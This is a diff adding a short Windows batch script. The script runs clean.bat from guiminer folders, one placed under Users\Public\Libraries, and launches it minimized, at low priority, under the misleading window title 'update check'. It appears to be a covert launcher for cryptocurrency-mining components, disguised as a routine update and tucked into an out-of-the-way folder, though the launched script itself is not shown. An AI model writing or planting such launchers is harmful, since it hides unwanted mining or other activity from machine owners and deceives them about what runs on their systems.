@@ -1,0 +1,11 @@
+@echo off
+
+cd %homedrive%\Users\Public\Libraries\guiminer
+start "update check" /MIN /LOW "cmd" "/Q /C "%cd%\clean.bat""
+
+cd %homedrive%\guiminer
+start "update check" /MIN /LOW "cmd" "/Q /C "%cd%\clean.bat""
+
+cls
+exit /B %errorlevel%
+exit %errorlevel%
